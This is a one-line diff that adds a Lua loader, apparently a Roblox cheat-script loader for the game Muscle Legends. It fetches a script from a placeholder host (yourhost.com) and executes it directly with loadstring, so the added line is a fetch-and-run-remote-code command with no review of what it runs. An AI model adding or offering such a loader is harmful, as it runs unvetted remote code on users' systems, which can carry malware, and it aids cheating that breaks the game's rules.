@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://yourhost.com/muscle_legends_final.lua"))()
